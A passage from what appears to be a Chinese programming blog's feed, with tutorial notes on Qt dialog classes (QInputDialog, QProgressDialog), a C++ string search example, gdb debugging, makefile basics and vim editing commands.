class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// 得到一个可以输入浮点数的对话框窗口, 返回对话框窗口中输入的浮点数</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">参数:</span><br><span class="hljs-comment">  - parent: 对话框窗口的父窗口</span><br><span class="hljs-comment">  - title: 对话框窗口显示的标题信息</span><br><span class="hljs-comment">  - label: 对话框窗口中显示的文本信息(用于描述对话框的功能)</span><br><span class="hljs-comment">  - value: 对话框窗口中显示的浮点值, 默认为 0</span><br><span class="hljs-comment">  - min: 对话框窗口支持显示的最小数值</span><br><span class="hljs-comment">  - max: 对话框窗口支持显示的最大数值</span><br><span class="hljs-comment">  - decimals: 浮点数的精度, 默认保留小数点以后1位</span><br><span class="hljs-comment">  - ok: 传出参数, 用于判断是否得到了有效数据, 一般不会使用该参数</span><br><span class="hljs-comment">  - flags: 对话框窗口的窗口属性, 使用默认值即可</span><br><span class="hljs-comment">*/</span><br>[<span class="hljs-type">static</span>] <span class="hljs-function"><span class="hljs-type">double</span> <span class="hljs-title">QInputDialog::getDouble</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">            QWidget *parent, <span class="hljs-type">const</span> QString &amp;title, </span></span><br><span class="hljs-params"><span class="hljs-function">            <span class="hljs-type">const</span> QString &amp;label, <span class="hljs-type">double</span> value = <span class="hljs-number">0</span>, </span></span><br><span class="hljs-params"><span class="hljs-function">            <span class="hljs-type">double</span> min = <span class="hljs-number">-2147483647</span>, <span class="hljs-type">double</span> max = <span class="hljs-number">2147483647</span>, </span></span><br><span class="hljs-params"><span class="hljs-function">            <span class="hljs-type">int</span> decimals = <span class="hljs-number">1</span>, <span class="hljs-type">bool</span> *ok = <span class="hljs-literal">nullptr</span>, </span></span><br><span class="hljs-params"><span class="hljs-function">            Qt::WindowFlags flags = Qt::WindowFlags())</span></span>;<br>   <br><span class="hljs-comment">// 得到一个可以输入整形数的对话框窗口, 返回对话框窗口中输入的整形数</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">参数:</span><br><span class="hljs-comment">  - parent: 对话框窗口的父窗口</span><br><span class="hljs-comment">  - title: 对话框窗口显示的标题信息</span><br><span class="hljs-comment">  - label: 对话框窗口中显示的文本信息(用于描述对话框的功能)</span><br><span class="hljs-comment">  - value: 对话框窗口中显示的整形值, 默认为 0</span><br><span class="hljs-comment">  - min: 对话框窗口支持显示的最小数值</span><br><span class="hljs-comment">  - max: 对话框窗口支持显示的最大数值</span><br><span class="hljs-comment">  - step: 步长, 通过对话框提供的按钮调节数值每次增长/递减的量</span><br><span class="hljs-comment">  - ok: 传出参数, 用于判断是否得到了有效数据, 一般不会使用该参数</span><br><span class="hljs-comment">  - flags: 对话框窗口的窗口属性, 使用默认值即可</span><br><span class="hljs-comment">*/</span><br>[<span class="hljs-type">static</span>] <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">QInputDialog::getInt</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">            QWidget *parent, <span class="hljs-type">const</span> QString &amp;title, </span></span><br><span class="hljs-params"><span class="hljs-function">            <span class="hljs-type">const</span> QString &amp;label, <span class="hljs-type">int</span> value = <span class="hljs-number">0</span>, </span></span><br><span class="hljs-params"><span class="hljs-function">            <span class="hljs-type">int</span> min = <span class="hljs-number">-2147483647</span>, <span class="hljs-type">int</span> max = <span class="hljs-number">2147483647</span>, </span></span><br><span class="hljs-params"><span class="hljs-function">            <span class="hljs-type">int</span> step = <span class="hljs-number">1</span>, <span class="hljs-type">bool</span> *ok = <span class="hljs-literal">nullptr</span>, </span></span><br><span class="hljs-params"><span class="hljs-function">            Qt::WindowFlags flags = Qt::WindowFlags())</span></span>;<br>   <br><span class="hljs-comment">// 得到一个带下来菜单的对话框窗口, 返回选择的菜单项上边的文本信息</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">参数:</span><br><span class="hljs-comment">  - parent: 对话框窗口的父窗口</span><br><span class="hljs-comment">  - title: 对话框窗口显示的标题信息</span><br><span class="hljs-comment">  - label: 对话框窗口中显示的文本信息(用于描述对话框的功能)</span><br><span class="hljs-comment">  - items: 字符串列表, 用于初始化窗口中的下拉菜单, 每个字符串对应一个菜单项</span><br><span class="hljs-comment">  - current: 通过菜单项的索引指定显示下拉菜单中的哪个菜单项, 默认显示第一个(编号为0)</span><br><span class="hljs-comment">  - editable: 设置菜单项上的文本信息是否可以进行编辑, 默认为true, 即可以编辑</span><br><span class="hljs-comment">  - ok: 传出参数, 用于判断是否得到了有效数据, 一般不会使用该参数</span><br><span class="hljs-comment">  - flags: 对话框窗口的窗口属性, 使用默认值即可</span><br><span class="hljs-comment">  - inputMethodHints: 设置显示模式, 默认没有指定任何特殊显示格式, 显示普通文本字符串</span><br><span class="hljs-comment">    - 如果有特殊需求, 可以参数帮助文档进行相关设置</span><br><span class="hljs-comment">*/</span><br>[<span class="hljs-type">static</span>] <span class="hljs-function">QString <span class="hljs-title">QInputDialog::getItem</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">            QWidget *parent, <span class="hljs-type">const</span> QString &amp;title, </span></span><br><span class="hljs-params"><span class="hljs-function">            <span class="hljs-type">const</span> QString &amp;label, <span class="hljs-type">const</span> QStringList &amp;items, </span></span><br><span class="hljs-params"><span class="hljs-function">            <span class="hljs-type">int</span> current = <span class="hljs-number">0</span>, <span class="hljs-type">bool</span> editable = <span class="hljs-literal">true</span>, <span class="hljs-type">bool</span> *ok = <span class="hljs-literal">nullptr</span>, </span></span><br><span class="hljs-params"><span class="hljs-function">            Qt::WindowFlags flags = Qt::WindowFlags(), </span></span><br><span class="hljs-params"><span class="hljs-function">            Qt::InputMethodHints inputMethodHints = Qt::ImhNone)</span></span>;<br>   <br><span class="hljs-comment">// 得到一个可以输入多行数据的对话框窗口, 返回用户在窗口中输入的文本信息</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">参数:</span><br><span class="hljs-comment">  - parent: 对话框窗口的父窗口</span><br><span class="hljs-comment">  - title: 对话框窗口显示的标题信息</span><br><span class="hljs-comment">  - label: 对话框窗口中显示的文本信息(用于描述对话框的功能)</span><br><span class="hljs-comment">  - text: 指定显示到多行输入框中的文本信息, 默认是空字符串</span><br><span class="hljs-comment">  - ok: 传出参数, 用于判断是否得到了有效数据, 一般不会使用该参数</span><br><span class="hljs-comment">  - flags: 对话框窗口的窗口属性, 使用默认值即可</span><br><span class="hljs-comment">  - inputMethodHints: 设置显示模式, 默认没有指定任何特殊显示格式, 显示普通文本字符串</span><br><span class="hljs-comment">    - 如果有特殊需求, 可以参数帮助文档进行相关设置</span><br><span class="hljs-comment">*/</span><br>[<span class="hljs-type">static</span>] <span class="hljs-function">QString <span class="hljs-title">QInputDialog::getMultiLineText</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">            QWidget *parent, <span class="hljs-type">const</span> QString &amp;title, <span class="hljs-type">const</span> QString &amp;label, </span></span><br><span class="hljs-params"><span class="hljs-function">            <span class="hljs-type">const</span> QString &amp;text = QString(), <span class="hljs-type">bool</span> *ok = <span class="hljs-literal">nullptr</span>, </span></span><br><span class="hljs-params"><span class="hljs-function">            Qt::WindowFlags flags = Qt::WindowFlags(), </span></span><br><span class="hljs-params"><span class="hljs-function">            Qt::InputMethodHints inputMethodHints = Qt::ImhNone)</span></span>;<br>   <br><span class="hljs-comment">// 得到一个可以输入单行信息的对话框窗口, 返回用户在窗口中输入的文本信息</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">参数:</span><br><span class="hljs-comment">  - parent: 对话框窗口的父窗口 </span><br><span class="hljs-comment">  - title: 对话框窗口显示的标题信息</span><br><span class="hljs-comment">  - label: 对话框窗口中显示的文本信息(用于描述对话框的功能)</span><br><span class="hljs-comment">  - mode: 指定单行编辑框中数据的反馈模式, 是一个 QLineEdit::EchoMode 类型的枚举值</span><br><span class="hljs-comment">    - QLineEdit::Normal: 显示输入的字符。这是默认值</span><br><span class="hljs-comment">    - QLineEdit::NoEcho: 不要展示任何东西。这可能适用于连密码长度都应该保密的密码。</span><br><span class="hljs-comment">    - QLineEdit::Password: 显示与平台相关的密码掩码字符，而不是实际输入的字符。</span><br><span class="hljs-comment">    - QLineEdit::PasswordEchoOnEdit: 在编辑时按输入显示字符，否则按密码显示字符。</span><br><span class="hljs-comment">  - text: 指定显示到单行输入框中的文本信息, 默认是空字符串</span><br><span class="hljs-comment">  - ok: 传出参数, 用于判断是否得到了有效数据, 一般不会使用该参数</span><br><span class="hljs-comment">  - flags: 对话框窗口的窗口属性, 使用默认值即可</span><br><span class="hljs-comment">  - inputMethodHints: 设置显示模式, 默认没有指定任何特殊显示格式, 显示普通文本字符串</span><br><span class="hljs-comment">     - 如果有特殊需求, 可以参数帮助文档进行相关设置</span><br><span class="hljs-comment">*/</span><br>[<span class="hljs-type">static</span>] <span class="hljs-function">QString <span class="hljs-title">QInputDialog::getText</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">            QWidget *parent, <span class="hljs-type">const</span> QString &amp;title, <span class="hljs-type">const</span> QString &amp;label,</span></span><br><span class="hljs-params"><span class="hljs-function">            QLineEdit::EchoMode mode = QLineEdit::Normal, </span></span><br><span class="hljs-params"><span class="hljs-function">            <span class="hljs-type">const</span> QString &amp;text = QString(), <span class="hljs-type">bool</span> *ok = <span class="hljs-literal">nullptr</span>, </span></span><br><span class="hljs-params"><span class="hljs-function">            Qt::WindowFlags flags = Qt::WindowFlags(), </span></span><br><span class="hljs-params"><span class="hljs-function">            Qt::InputMethodHints inputMethodHints = Qt::ImhNone)</span></span>;<br>   <br></code></pre></td></tr></table></figure></li></ol><h4 id="QProgressDialog（进度条）"><a href="#QProgressDialog（进度条）" class="headerlink" title="QProgressDialog（进度条）"></a>QProgressDialog（进度条）</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// 构造函数</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">参数:</span><br><span class="hljs-comment">  - labelText: 对话框中显示的提示信息</span><br><span class="hljs-comment">  - cancelButtonText: 取消按钮上显示的文本信息</span><br><span class="hljs-comment">  - minimum: 进度条最小值</span><br><span class="hljs-comment">  - maximum: 进度条最大值</span><br><span class="hljs-comment">  - parent: 当前窗口的父对象</span><br><span class="hljs-comment">  - f: 当前进度窗口的flag属性, 使用默认属性即可, 无需设置</span><br><span class="hljs-comment">*/</span><br>QProgressDialog::<span class="hljs-built_in">QProgressDialog</span>(<br>    QWidget *parent = <span class="hljs-literal">nullptr</span>, <br>    Qt::WindowFlags f = Qt::<span class="hljs-built_in">WindowFlags</span>());<br><br>QProgressDialog::<span class="hljs-built_in">QProgressDialog</span>(<br>    <span class="hljs-type">const</span> QString &amp;labelText, <span class="hljs-type">const</span> QString &amp;cancelButtonText, <br>    <span class="hljs-type">int</span> minimum, <span class="hljs-type">int</span> maximum, QWidget *parent = <span class="hljs-literal">nullptr</span>,<br>    Qt::WindowFlags f = Qt::<span class="hljs-built_in">WindowFlags</span>());<br><br><br><span class="hljs-comment">// 设置取消按钮显示的文本信息</span><br>[slot] <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">QProgressDialog::setCancelButtonText</span><span class="hljs-params">(<span class="hljs-type">const</span> QString &amp;cancelButtonText)</span></span>;<br><br><span class="hljs-comment">// 公共成员函数和槽函数</span><br><span class="hljs-function">QString <span class="hljs-title">QProgressDialog::labelText</span><span class="hljs-params">()</span> <span class="hljs-type">const</span></span>;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">QProgressDialog::setLabelText</span><span class="hljs-params">(<span class="hljs-type">const</span> QString &amp;text)</span></span>;<br><br><span class="hljs-comment">// 得到进度条最小值</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">QProgressDialog::minimum</span><span class="hljs-params">()</span> <span class="hljs-type">const</span></span>;<br><span class="hljs-comment">// 设置进度条最小值</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">QProgressDialog::setMinimum</span><span class="hljs-params">(<span class="hljs-type">int</span> minimum)</span></span>;<br><br><span class="hljs-comment">// 得到进度条最大值</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">QProgressDialog::maximum</span><span class="hljs-params">()</span> <span class="hljs-type">const</span></span>;<br><span class="hljs-comment">// 设置进度条最大值</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">QProgressDialog::setMaximum</span><span class="hljs-params">(<span class="hljs-type">int</span> maximum)</span></span>;<br><br><span class="hljs-comment">// 设置进度条范围(最大和最小值)</span><br>[slot] <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">QProgressDialog::setRange</span><span class="hljs-params">(<span class="hljs-type">int</span> minimum, <span class="hljs-type">int</span> maximum)</span></span>;<br><br><span class="hljs-comment">// 得到进度条当前的值</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">QProgressDialog::value</span><span class="hljs-params">()</span> <span class="hljs-type">const</span></span>;<br><span class="hljs-comment">// 设置进度条当前的值</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">QProgressDialog::setValue</span><span class="hljs-params">(<span class="hljs-type">int</span> progress)</span></span>;<br><br><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">QProgressDialog::autoReset</span><span class="hljs-params">()</span> <span class="hljs-type">const</span></span>;<br><span class="hljs-comment">// 当value() = maximum()时，进程对话框是否调用reset()，此属性默认为true。</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">QProgressDialog::setAutoReset</span><span class="hljs-params">(<span class="hljs-type">bool</span> reset)</span></span>;<br><br><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">QProgressDialog::autoClose</span><span class="hljs-params">()</span> <span class="hljs-type">const</span></span>;<br><span class="hljs-comment">// 当value() = maximum()时，进程对话框是否调用reset()并且隐藏，此属性默认为true。</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">QProgressDialog::setAutoClose</span><span class="hljs-params">(<span class="hljs-type">bool</span> close)</span></span>;<br><br><span class="hljs-comment">// 判断用户是否按下了取消键, 按下了返回true, 否则返回false</span><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">wasCanceled</span><span class="hljs-params">()</span> <span class="hljs-type">const</span></span>;<br><br><br><span class="hljs-comment">// 重置进度条</span><br><span class="hljs-comment">// 重置进度对话框。wascancelled()变为true，直到进程对话框被重置。进度对话框被隐藏。</span><br>[slot] <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">QProgressDialog::cancel</span><span class="hljs-params">()</span></span>;<br><span class="hljs-comment">// 重置进度对话框。如果autoClose()为真，进程对话框将隐藏。</span><br>[slot] <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">QProgressDialog::reset</span><span class="hljs-params">()</span></span>;   <br><br><span class="hljs-comment">// 信号</span><br><span class="hljs-comment">// 当单击cancel按钮时，将发出此信号。默认情况下，它连接到cancel()槽。</span><br>[signal] <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">QProgressDialog::canceled</span><span class="hljs-params">()</span></span>;<br><br><span class="hljs-comment">// 设置窗口的显示状态(模态, 非模态)</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">参数:</span><br><span class="hljs-comment">    Qt::NonModal  -&gt; 非模态</span><br><span class="hljs-comment">    Qt::WindowModal-&gt; 模态, 阻塞父窗口</span><br><span class="hljs-comment">    Qt::ApplicationModal -&gt; 模态, 阻塞应用程序中的所有窗口</span><br><span class="hljs-comment">*/</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">QWidget::setWindowModality</span><span class="hljs-params">(Qt::WindowModality windowModality)</span></span>;<br><br></code></pre></td></tr></table></figure><h3 id="QMainWindow"><a href="#QMainWindow" class="headerlink" title="QMainWindow"></a>QMainWindow</h3><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/qt/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/image-20230730161837845.png" alt="image-20230730161837845"></p><p><img src="https://subingwen.cn/qt/qt-base-window/image-b255c1da57dc41f780f16f3e82f75f7c.png" alt="QMainWindow类型窗口结构"></p><ol><li><p>菜单栏</p><ul><li><p>在ui中添加菜单栏</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/qt/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/image-20230730162004616.png" alt="image-20230730162004616"></p></li></ul></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>QT</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>c++新特性</title>
    <link href="/2023/06/26/c++/cpp%E6%96%B0%E7%89%B9%E6%80%A7/"/>
    <url>/2023/06/26/c++/cpp%E6%96%B0%E7%89%B9%E6%80%A7/</url>
    
    <content type="html"><![CDATA[<ol><li><p>在<code>string</code>里面使用<code>find</code>函数查找子串</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c++">   <br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    std::string a=<span class="hljs-string">&quot;this&quot;</span>;<br>    std::string b=<span class="hljs-string">&quot;this is b&quot;</span>;<br>    <span class="hljs-type">const</span> <span class="hljs-keyword">auto</span> tem= a&lt;=&gt;b;<br>    <span class="hljs-keyword">auto</span> i=b.<span class="hljs-built_in">find</span>(a);<br>    <span class="hljs-keyword">if</span>(i!=std::string::npos)&#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = i; j &lt; i+a.<span class="hljs-built_in">size</span>(); ++j) &#123;<br>            std::cout&lt;&lt;b[j];<br>        &#125;<br>        std::cout&lt;&lt;std::endl&lt;&lt;<span class="hljs-string">&quot;^&quot;</span>&lt;&lt;i;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>   <br></code></pre></td></tr></table></figure></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>c++基础</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>dgb调试</title>
    <link href="/2023/06/24/linux/dgb%E8%B0%83%E8%AF%95/"/>
    <url>/2023/06/24/linux/dgb%E8%B0%83%E8%AF%95/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="gdb调试"><a href="#gdb调试" class="headerlink" title="gdb调试"></a>gdb调试</h1><h2 id="gdb的使用"><a href="#gdb的使用" class="headerlink" title="gdb的使用"></a>gdb的使用</h2><blockquote><p> -g 将调试信息写入到可执行程序中</p><p> gcc -g args.c -o app</p></blockquote><h3 id="使用流程"><a href="#使用流程" class="headerlink" title="使用流程"></a>使用流程</h3><ol><li><p>启动</p><p><code>gdb 调试文件</code></p></li><li><p>进入代码模式</p><p>在以下界面输入<code>l</code></p><p><img src="https://linux-1317182407.cos.ap-nanjing.myqcloud.com/gdb/image-20230624203806212.png"></p></li><li><p>退出</p><p><code>quit</code></p><p><img src="https://linux-1317182407.cos.ap-nanjing.myqcloud.com/gdb/image-20230624203907802.png"></p></li><li><p>设置命令行参数</p><p><code>set args</code></p></li><li><p>查看设置的参数</p><p>show args</p></li><li><p>启动程序</p><ul><li><p>start  只会执行一行</p><p>c    会继续执行命令</p></li><li><p>run   会把程序执行完</p></li></ul></li><li><p>查看本文件的代码</p><p><img src="https://linux-1317182407.cos.ap-nanjing.myqcloud.com/gdb/image-20230625222900269.png"></p></li><li><p>查看其他文件的代码</p><p><img src="https://linux-1317182407.cos.ap-nanjing.myqcloud.com/gdb/image-20230626091119591.png" alt="image-20230626091119591"></p></li><li><p>直接回车是执行上一次的命令</p></li><li><p>设置显示的行数</p></li></ol><p>   <code>set listsize 20</code>显示20行</p><ol start="11"><li><p>设置断点</p><ul><li><p>对某一行设置断点</p><p><code>b 行号</code></p></li><li><p>条件断点</p><p><code>b if 变量=值</code></p></li></ul></li><li><p>控制断点的状态</p><ul><li><p>删除断点</p><p><code>del</code></p></li><li><p>使断点失效</p><p><code>dis</code></p></li><li><p>恢复断点</p><p><code>ena</code></p></li></ul></li><li><p>打印值</p><ul><li><p><code>p  变量名</code></p><p>这种方法只会进行一次，使用一次打印一次</p><p><img src="https://linux-1317182407.cos.ap-nanjing.myqcloud.com/gdb/image-20230626095112562.png" alt="image-20230626095112562"></p></li><li><p>自动跟踪某个变量</p><ul><li><p><code>display 变量名</code></p></li><li><p><code>info display</code></p><p>看跟踪了哪些变量</p></li><li><p>取消跟踪</p><p><code>undisplay 编号</code></p></li><li><p>禁用</p><p><code>disable display 编号</code></p></li><li><p>启用</p><p><code>enable display 编号</code></p></li></ul></li></ul></li><li><p>打印类型</p><p>ptype 变量名</p></li><li><p>调试</p><ul><li><p>单步调试</p><ul><li><p><code>step</code>  命令一行一行的向下运行</p></li><li><p><code>finish</code></p><p>跳出函数</p></li><li><p><code>until</code></p><p>跳出循环体</p></li></ul></li></ul></li><li><p>设置变量值</p><p><code>set var 变量名=值</code></p></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>简单的聊天室</title>
    <link href="/2023/06/23/go/%E7%AE%80%E5%8D%95%E7%9A%84%E8%81%8A%E5%A4%A9%E5%AE%A4/"/>
    <url>/2023/06/23/go/%E7%AE%80%E5%8D%95%E7%9A%84%E8%81%8A%E5%A4%A9%E5%AE%A4/</url>
    
    <content type="html"><![CDATA[<h1 id="简单的聊天室"><a href="#简单的聊天室" class="headerlink" title="简单的聊天室"></a>简单的聊天室</h1>]]></content>
    
    
    
    <tags>
      
      <tag>go</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>makefile</title>
    <link href="/2023/06/20/linux/makefile/"/>
    <url>/2023/06/20/linux/makefile/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="makefile"><a href="#makefile" class="headerlink" title="makefile"></a>makefile</h1><h2 id="make是什么"><a href="#make是什么" class="headerlink" title="make是什么"></a>make是什么</h2><p> make 是一个命令工具，是一个解释 makefile 中指令的命令工具</p><h2 id="创建"><a href="#创建" class="headerlink" title="创建"></a>创建</h2><figure class="highlight make"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs make"><span class="hljs-comment"># 举例: 有源文件 a.c b.c c.c head.h, 需要生成可执行程序 app</span><br><span class="hljs-comment">################# 例1 #################</span><br><span class="hljs-section">app:a.c b.c c.c</span><br>    gcc a.c b.c c.c -o app<br><br><span class="hljs-comment">################# 例2 #################</span><br><span class="hljs-comment"># 有多个目标, 多个依赖, 多个命令</span><br><span class="hljs-section">app,app1:a.c b.c c.c d.c</span><br>    gcc a.c b.c -o app<br>    gcc c.c d.c -o app1<br><br><span class="hljs-comment">################# 例3 #################</span><br><span class="hljs-comment"># 规则之间的嵌套</span><br><span class="hljs-section">app:a.o b.o c.o</span><br>    gcc a.o b.o c.o -o app<br><span class="hljs-comment"># a.o 是第一条规则中的依赖</span><br><span class="hljs-section">a.o:a.c</span><br>    gcc -c a.c<br><span class="hljs-comment"># b.o 是第一条规则中的依赖</span><br><span class="hljs-section">b.o:b.c</span><br>    gcc -c b.c<br><span class="hljs-comment"># c.o 是第一条规则中的依赖</span><br><span class="hljs-section">c.o:c.c</span><br>    gcc -c c.c<br><br></code></pre></td></tr></table></figure><ol><li>如果我们的<code>makefile</code>写的不完整，就会直接自己自动推导</li></ol><h2 id="常用的指令"><a href="#常用的指令" class="headerlink" title="常用的指令"></a>常用的指令</h2><p><img src="https://linux-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%99%E6%80%81%E5%BA%93%E5%92%8C%E5%8A%A8%E6%80%81%E5%BA%93/image-20230620213607086.png"></p>]]></content>
    
    
    
    <tags>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vim</title>
    <link href="/2023/06/18/linux/vim/"/>
    <url>/2023/06/18/linux/vim/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="vim的使用"><a href="#vim的使用" class="headerlink" title="vim的使用"></a>vim的使用</h1><h2 id="光表移动"><a href="#光表移动" class="headerlink" title="光表移动"></a>光表移动</h2><ol><li><p>移动到行尾</p><p><code>$</code></p></li><li><p>移动到行首</p><p><code>0</code></p></li><li><p>移动到整个文件的最开始</p><p><code>gg</code></p></li><li><p>移动到真个文件的最后</p><p><code>G</code></p></li><li><p>跳转行</p><p><code>nG</code></p></li></ol><h2 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h2><ol><li><p>删除单词</p><p><code>dw</code> </p><p>但是注意必须要将光标置于最前方</p></li><li><p>删除光标前的字符串</p><p><code>d0</code></p></li><li><p>删除行</p><p><code>D</code>或者<code>dd</code></p></li><li><p>删除多行</p><p><code>ddnd</code>或者<code>ndd</code></p></li></ol><h2 id="撤销与反撤销"><a href="#撤销与反撤销" class="headerlink" title="撤销与反撤销"></a>撤销与反撤销</h2><ol><li><p>撤销</p><p><code>u</code></p></li><li><p>反撤销</p><p><code>ctrl+r</code></p></li></ol><h2 id="复制与粘贴"><a href="#复制与粘贴" class="headerlink" title="复制与粘贴"></a>复制与粘贴</h2><ol><li><p>粘贴到行的下边</p><p><code>p</code></p><p>小写的p</p></li><li><p>粘贴在行的上面</p><p><code>P</code></p><p>大写的<code>P</code></p></li><li><p>复制光标所在行</p><p><code>yy</code></p></li><li><p>从光标往下复制</p><p><code>nyy</code></p></li></ol><h2 id="可视化模式"><a href="#可视化模式" class="headerlink" title="可视化模式"></a>可视化模式</h2><ol><li><p>多行注释</p><p><code>ctrl+v</code></p><p><code>I</code></p><p>选择<code>//</code></p><p>退出<code>ESC</code></p></li><li><p>多行删除</p><p><code>ctrl+v</code></p><p>选择</p><p><code>D</code></p></li></ol><h2 id="替换"><a href="#替换" class="headerlink" title="替换"></a>替换</h2><ol><li><p>修改单个字符</p><p><code>r</code></p></li><li><p>连续修改</p><p><code>R</code></p></li><li><p>在末行模式下的替换</p><ul><li><p><code>:/s/main/mian</code></p><p>这样只会替换第一个关键字</p></li><li><p><code>:s/chg/zjy/g</code></p><p>替换光标所在行所有的<code>chg</code>为<code>zjy</code></p></li><li><p><code>:10,20s/chg/zjy/g</code></p><p>替换<code>10-20</code>行所有的<code>chg</code>为<code>zjy</code></p><p>如果不加<code>/g</code>就是替换掉每行第一个</p></li><li><p><code>:%s/chg/zjy/g</code></p><p>替换文章所有的</p></li></ul></li></ol><h2 id="查找"><a href="#查找" class="headerlink" title="查找"></a>查找</h2><p><img 